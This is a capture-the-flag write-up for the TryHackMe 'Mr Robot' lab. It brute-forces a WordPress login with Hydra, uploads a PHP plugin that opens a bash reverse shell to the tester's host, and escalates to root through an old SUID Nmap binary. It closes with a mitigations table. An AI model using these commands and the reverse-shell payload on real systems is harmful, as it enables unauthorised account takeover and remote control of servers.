[Mr Robot CTF](https://tryhackme.com/room/mrrobot)

**Difficulty:** Medium

**Objective:** Enumerate a WordPress instance, brute-force login, upload a reverse shell plugin, and escalate privileges via vulnerable Nmap SUID binary.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.122.143  
**Service/Ports:** 80/HTTP, 443/HTTPS  
**Entry Point:** WordPress login form  
**Privilege Escalation:** Nmap interactive mode (SUID binary)  
**Outcome:** Gained root shell, captured key-2-of-3 and key-3-of-3

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance  
Initial Nmap scan:  
nmap 10.10.122.143 -sV  
Results:  
Port 80: Apache httpd  
Port 443: Apache httpd (SSL)  
Port 22: Closed  
Web server showed generic Mr. Robot theme content with minimal interaction.

---

## 4. Enumeration  
Ran Gobuster:  
gobuster dir -u http://10.10.122.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
Interesting results: /wp-login, /license, /readme, /robots  
Robots.txt contained clues and a downloadable wordlist: fsocity.dic  
Downloaded the wordlist: wget http://10.10.122.143/fsocity.dic  
Captured login form in Burp Suite to identify response messages  
Used Hydra to brute-force usernames:  
hydra -L fsocity.dic -p test 10.10.122.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"  
Found valid user: Elliot  
Brute-forced password:  
hydra -l Elliot -P fsocity.dic 10.10.122.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username"  
Sorted the wordlist to improve speed: sort -u fsocity.dic > newlist.txt  
Found password: ER28-0652

---

## 5. Exploitation  
Logged into WordPress as Elliot  
Created a reverse shell plugin with the following code:  
<?php  
/*  
Plugin Name: Shell  
*/  
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.157.185/1337 0>&1'");  
?>  
Saved as shell.php and zipped it: zip shell.zip shell.php  
Uploaded the plugin via WordPress admin panel  
Set up listener: nc -lvnp 1337  
Executed the plugin and received shell as user daemon

---

## 6. Privilege Escalation  
Enumerated SUID binaries:  
find / -perm -4000 -type f 2>/dev/null  
Found vulnerable version of Nmap: /usr/local/bin/nmap  
Checked version: 3.81 (supports deprecated --interactive mode)  
Launched interactive shell: /usr/local/bin/nmap --interactive  
Typed: !sh  
Gained root shell

---

## 7. Post Exploitation  
Searched for final flags using:  
find / -name "key-2-of-3.txt" 2>/dev/null  
Found: /home/robot/key-2-of-3.txt  
Then: find / -name "key-3-of-3.txt" 2>/dev/null  
Found: /root/key-3-of-3.txt

---

## 8. Flags / Proof  
User Flag: Previously captured  
Key 2 of 3: /home/robot/key-2-of-3.txt  
Key 3 of 3: /root/key-3-of-3.txt

---

## 9. Mitigations  
| Vulnerability                     | Risk     | Suggested Mitigation                              |  
|----------------------------------|----------|---------------------------------------------------|  
| Weak WordPress Credentials       | High     | Enforce strong passwords and rate-limit logins    |  
| Uploadable Plugins               | High     | Restrict plugin uploads to vetted admins only     |  
| SUID Nmap (Old Version)          | Critical | Remove or upgrade Nmap to disable --interactive   |  
| Wordlist Exposure in robots.txt  | Medium   | Avoid exposing internal files in public configs   |

---

## 10. Notes  
Time spent: ~1 hour

Tools used: nmap, gobuster, hydra, burp suite, WordPress, nc  

Lessons learned: Outdated binaries and misconfigured web services provide a powerful attack path when chained properly. Always check for SUID and known-exploitable software like old Nmap versions.


























